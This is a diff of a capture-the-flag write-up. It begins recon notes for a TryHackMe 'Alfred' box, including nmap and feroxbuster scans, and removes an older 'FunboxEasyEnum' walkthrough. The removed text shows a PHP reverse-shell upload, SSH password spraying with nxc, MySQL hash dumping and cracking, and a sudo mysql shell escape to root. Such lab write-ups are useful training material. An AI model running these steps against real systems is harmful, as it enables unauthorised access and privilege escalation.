@@ -39,9 +39,8 @@ Host appears unreachable, I added the -Pn flag in case ICMP is being dropped:
 ┌──(haunter㉿kali)-[~/working/thm/easy/alfred]
 └─$ sudo nmap -A -p- -vvv -T3 --open -oN nmap_tcp_full -Pn $alfred 
 
-80/tcp   open  http               syn-ack ttl 125 Microsoft IIS httpd 7.5                                                                                                                                                
-3389/tcp open  ssl/ms-wbt-server? syn-ack ttl 125                                                                                                                                                                        
-rdp-ntlm-info:                                      
+80/tcp   open  http               syn-ack ttl 125 Microsoft IIS httpd 7.5                                   
+3389/tcp open  ssl/ms-wbt-server? syn-ack ttl 125                                                           rdp-ntlm-info:                                      
 |   Target_Name: ALFRED                               
 |   NetBIOS_Domain_Name: ALFRED
 |   NetBIOS_Computer_Name: ALFRED
@@ -52,211 +51,70 @@ rdp-ntlm-info:
 |_http-server-header: Jetty(9.4.z-SNAPSHOT)
 ```
 
+There we go, we have three ports open: 2 webservers on :80 and :8080, and RDP on :3389.
+
+I started with walking the two webapps.
+
+### Webserver on TCP/80
+
+![Landing page on port 80](/assets/img/ctf/thm/easy/alfred/1.png)
+
+The site appears to be a single page with no interactive features. I checked the page source and found nothing of value. Additionally, I performed directory and file discovery with *feroxbuster* but found no other pages or directories on this port.
+
+The page does potentially show two users, *bruce* and *alfred*. I recorded these in *users.txt* for potential use later.
+
+```bash
+┌──(haunter㉿kali)-[~/working/thm/easy/Alfred]
+└─$ cat users.txt 
+alfred
+bruce
+```
+
+### Webserver on TCP/8080
+
+I then moved to walk the other webserver on :8080
+
+![Landing page for webserver on port 8080](/assets/img/ctf/thm/easy/alfred/2.png)
+
+I tried to login using the potential usernames from earlier using combos as *bruce:bruce* and *alfred:bruce* as Jenkins documentation states that the default password is either created on setup or randomized. Bruteforcing may be an option if I can't find a path forward after further enum.
+
+I tried to do some discovery:
+
+```bash
+┌──(haunter㉿kali)-[~/working/thm/easy/Alfred]                                                              └─$ feroxbuster --url http://$alfred:8080 --depth 2 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do
+ ___  ___  __   __     __      __         __   ___                                                          
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                           
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                          
+by Ben "epi" Risher 🤓                 ver: 2.10.4                                                          
+───────────────────────────┬──────────────────────                                                          
+ 🎯  Target Url            │ http://10.201.11.17:8080                                                       
+ 🚀  Threads               │ 50                                                                             
+ 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt      
+ 💢  Status Code Filters   │ [404]                                                                          
+ 💥  Timeout (secs)        │ 7                                                                              
+ 🦡  User-Agent            │ feroxbuster/2.10.4                                                             
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                             
+ 🔎  Extract Links         │ true                                                                           
+ 💲  Extensions            │ [php, sh, txt, cgi, html, js, css, py, zip, aspx, pdf, docx, doc, md, log, htm, asp, do]
+...
+200      GET        3l       13w       71c http://10.201.11.17:8080/robots.txt
+```
+
+![Port 8080 robots.txt](/assets/img/ctf/thm/easy/alfred/3.png)
+
+Found *robots.txt* which unfortunately didn't have any intel of value.
+
+
+
+
 
 ## Foothold
 
-I navigated to the last remaining interesting artifact: /mini.php
-
-![mini.php webshell](/assets/img/ctf/offsec/easy/FunBoxEasyEnum/5.png)
-
-Ah yeah, we have an psuedo-webshell. Looks like we can upload/delete files to the webserver. There are a couple of things we could do here, but I'll try to upload a PHP revershell to get a foothold.
-
-I'll use [Pentestmonkey's PHP reverse shell](https://pentestmonkey.net/tools/php-reverse-shell)
-
-Once downloaded I made changes to include my $attacker IP and port for my local listener.
-
-![Revshell mods](/assets/img/ctf/offsec/easy/FunBoxEasyEnum/6.png)
-
-I upload the file under the same name and then start a local listener:
-
-```bash
-┌──(haunter㉿kali)-[~/working/offsec/easy/FunboxEasyEnum]
-└─$ sudo nc -lvnp 4444
-[sudo] password for haunter: 
-listening on [any] 4444 ...
-connect to [192.168.45.209] from (UNKNOWN) [192.168.134.132] 33224
-Linux funbox7 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
- 19:03:21 up  1:04,  0 users,  load average: 0.00, 0.00, 0.07
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-
-$ python3 -c "import pty;pty.spawn('/bin/bash')"
-www-data@funbox7:/$ whoami
-whoami
-www-data
-www-data@funbox7:/$ 
-
-```
-
-Great, we have a revshell. I upgrade my shell and check my user context.
-
 ### Foothold Recon
-
-Let's check for users and then add them to users.txt locally:
-
-```bash
-# on $funbox
-www-data@funbox7:/home$ ls
-ls
-goat  harry  karla  oracle  sally
-```
-
-```bash
-# on $attacker
-┌──(haunter㉿kali)-[~/working/offsec/easy/FunboxEasyEnum]
-└─$ cat users.txt 
-goat
-harry
-karla
-oracle
-sally
-```
 
 ## Lateral Movement / Privilege Escalation
 
-Since I tried other basic manual enum techniques already, I'll get linPEAS on $funbox and see if it finds any privEsc vectors. In the meantime I'll try an SSH bruteforce with the usernames I found.
-
-As I only have usernames at this point and no passwords, I find it best to *use the usernames as a password list first* before moving onto a password list like rockyou.
-
-```bash
-┌──(haunter㉿kali)-[~/working/offsec/easy/FunboxEasyEnum]
-└─$ nxc ssh $funbox -u users.txt -p users.txt --ignore-pw-decoding
-SSH         192.168.134.132 22     192.168.134.132  [*] SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
-SSH         192.168.134.132 22     192.168.134.132  [+] goat:goat (Pwn3d!) Linux - Shell access!
-```
-
-To my surprise it actually got a hit with *goat:goat* 
-
-```bash
-┌──(haunter㉿kali)-[~/working/offsec/easy/FunboxEasyEnum]
-└─$ ssh goat@$funbox
-
-The authenticity of host '192.168.134.132 (192.168.134.132)' can't be established.
-ED25519 key fingerprint is SHA256:O6BLR8bFSyZavzqwjyqsKadofhK4GNKalxHMVbZR+5Q.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '192.168.134.132' (ED25519) to the list of known hosts.
-
-goat@192.168.134.132's password: 
-
-Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-117-generic x86_64)
-
-goat@funbox7:~$ 
-```
-
-Manually enumerating user permssions, including sudo, are a priority to check first:
-
-```bash
-goat@funbox7:~$ sudo -l                                                                                                                                                                                                  
-Matching Defaults entries for goat on funbox7:                                                                                                                                                                           
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                                                                    
-                                                                                                                                                                                                                         
-User goat may run the following commands on funbox7:                                                                                                                                                                     
-    (root) NOPASSWD: /usr/bin/mysql                                                                                                                                                                                      
-goat@funbox7:~$ sudo mysql -u root        
-```
-
- *(root) NOPASSWD: /usr/bin/mysql* is listed for user *goat*. Let's drop into it and see what we can find.
-
-```bash
-goat@funbox7:~$ sudo mysql -u root                                                                                                                                                                                       
-                                                     
-mysql> show databases;
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| db1                |
-| mysql              |
-| performance_schema |
-| phpmyadmin         |  
-| sys                |
-+--------------------+
-6 rows in set (0.00 sec)                                                                                    
-
-mysql> use db1;
-
-Database changed
-mysql> show tables;
-+---------------+
-| Tables_in_db1 |
-+---------------+
-| users         |
-+---------------+
-1 row in set (0.00 sec)
-
-mysql> select * from users;
-
-+----+-------+----------------------------------+
-| id | name  | passwd                           |
-+----+-------+----------------------------------+
-| 1  | harry | e10adc3949ba59abbe56e057f20f883e |
-+----+-------+----------------------------------+
-1 row in set (0.00 sec)
-```
-
-We found some good intel, user *harry*'s password hash.
-
-Cracking the hash worth a shot. We can try with *hashcat* or *jack*, but Crackstation is always a good tool for a first try with a simple hash.
-
-[Crackstation](https://crackstation.net/)
-
-![Crackstation](/assets/img/ctf/offsec/easy/FunBoxEasyEnum/7.png)
-
-The hash was in MD5 format and the password is *123456*. Now let's try to login as *harry*
-
-```bash
-┌──(haunter㉿kali)-[~/working/offsec/easy/FunboxEasyEnum]                                                   
-└─$ ssh harry@$funbox                                                                                       
-harry@192.168.134.132's password:                                                                           
-Permission denied, please try again.                                                                        
-harry@192.168.134.132's password:                                                                           
-Permission denied, please try again.                                                                        
-harry@192.168.134.132's password:                                                                           
-harry@192.168.134.132: Permission denied (publickey,password)
-```
-
-Well it doesn't seem like the user can SSH. I also tried logging into the phpmyadmin portal with no success either.
-
-```bash
-goat@funbox7:~$ su harry
-Password: 
-harry@funbox7:/home/goat$ 
-```
-
-User *harry* may be a rabbit hole. I'll rexamine *goat* further.
-
 ## Root / SYSTEM
 
-I decided to go back and rexamine the sudo command with *NOPASSWD*. 
-
-```bash
-goat@funbox7:/$ sudo -l
-sudo -l
-Matching Defaults entries for goat on funbox7:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User goat may run the following commands on funbox7:
-    (root) NOPASSWD: /usr/bin/mysql
-```
-
-*GTFOBins* is a resource I've heard constantly praised by my seniors in the community, but I haven't readily adopted yet. This turns out to have been a mistake; GTFOBins lists a method to get a shell at root with the sudo permission!
-
-[GTFOBins mysql sudo shell](https://gtfobins.github.io/gtfobins/mysql/#sudo)
-
-```bash
-goat@funbox7:/$ sudo mysql -e '\! /bin/sh'
-sudo mysql -e '\! /bin/sh'
-# whoami
-whoami
-root
-```
-
-FunboxEasyEnum has been rooted.
-
 # Lessons Learned
-* Rabit holes are a PITA. Use a timer to avoid staying in one for too long
-* When trying to bruteforce an account's password, always try the username as the password first
-* GTFOBins is an invaluable resource when potentially exploiting bins
+
